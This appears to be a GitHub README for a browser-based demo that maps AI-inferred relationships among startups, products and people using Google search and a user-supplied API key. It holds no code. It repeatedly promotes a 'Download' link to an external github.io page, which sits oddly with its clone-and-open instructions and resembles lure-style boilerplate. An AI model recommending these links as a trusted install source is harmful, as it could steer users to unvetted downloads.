# DEMO Graph Tool v0.1.0 - graph builder 2026

> **A browser-based graph exploration tool for discovering AI-inferred relationships among startups, products, and people with help from Google search, released as version 0.1.0.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/rothmarc1958/demo-graph-tool-builder?style=flat-square)](https://github.com/rothmarc1958/demo-graph-tool-builder)

---

<p align="center">
  <a href="https://rothmarc1958.github.io/demo-graph-tool-builder/">
    <img src="https://img.shields.io/badge/Download-DEMO%20Graph%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download DEMO Graph Tool">
  </a>
</p>

> **[Download DEMO Graph Tool v0.1.0](https://rothmarc1958.github.io/demo-graph-tool-builder/)**

---

[Download Latest Build](https://rothmarc1958.github.io/demo-graph-tool-builder/)

---

## Overview

DEMO Graph Tool is a self-contained HTML demo that creates interactive relationship graphs directly in a web browser. Its visual node interface helps map potential connections among startups, products, and people.

The application combines AI-assisted inference with information gathered from Google search results to propose relationships and assemble an explorable network. Since the demo operates in the browser, it provides a lightweight option for testing relationship-mapping ideas without deploying a backend service.

---

## What It Provides

- Generates graphs from entity information with AI assistance
- Uses Google search results as signals for identifying related entities
- Represents inferred connections among startups, products, and people
- Lets users interact with nodes to examine relationship paths
- Distributed as a single static HTML file
- Requires no server for browser-based operation
- Supports entering and using your own API key
- Useful for rapid visual prototypes and exploratory work

---

## Getting Started

1. Download or clone the repository:
   `git clone https://github.com/rothmarc1958/demo-graph-tool-builder.git
2. Open the provided HTML file with a modern web browser.
3. When prompted by the demo, enter your own API key before creating a graph.

You can run the page directly from your computer, or place it behind any basic static file host for a quick launch.

---

## Using the Demo

Load the HTML demo, enter the entities you want to investigate, and start graph generation. Using available search information and AI-based inference, the tool creates a connected visualization of the supplied data.

A normal session looks like this:

1. Add names for startups, products, or people.
2. Enter an API key when the workflow requests one.
3. Start the graph-generation process.
4. Select nodes to review related entities and navigate the network.

The project is designed for direct browser interaction, so it does not rely on command-line options or flags.

---

## Browser Configuration

The demo exposes its configuration through the page interface and any API key fields it provides. As a single-file HTML application, its behavior and settings may be defined within the page code or retained in the browser's local storage.

To customize or inspect the available behavior, examine the HTML file for:

- API key fields and provider-related settings
- Controls that govern graph creation
- Search and inference parameters
- Values saved through local storage

---

## Requirements

- A modern web browser with JavaScript enabled
- Internet connectivity when the demo performs Google search-based lookups
- An API key for workflows that require one
- Local storage or static hosting capability for operating the single-file HTML page

---

## Frequently Asked Questions

**Where does DEMO Graph Tool run?**  
It runs as a static HTML application inside the browser.

**Which entities can I explore?**  
The demo focuses on startups, products, and people, and infers possible relationships between them.

**Is an API key required?**  
The project follows a bring-your-own API key model, so an API key is required for the applicable workflow.

**How can I modify the configuration?**  
Review the HTML file and use any configuration controls available within the browser interface.

**Why might the graph fail to appear?**  
Check that JavaScript is supported and enabled in your browser, verify your network connection, and make sure any required API key was entered correctly.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
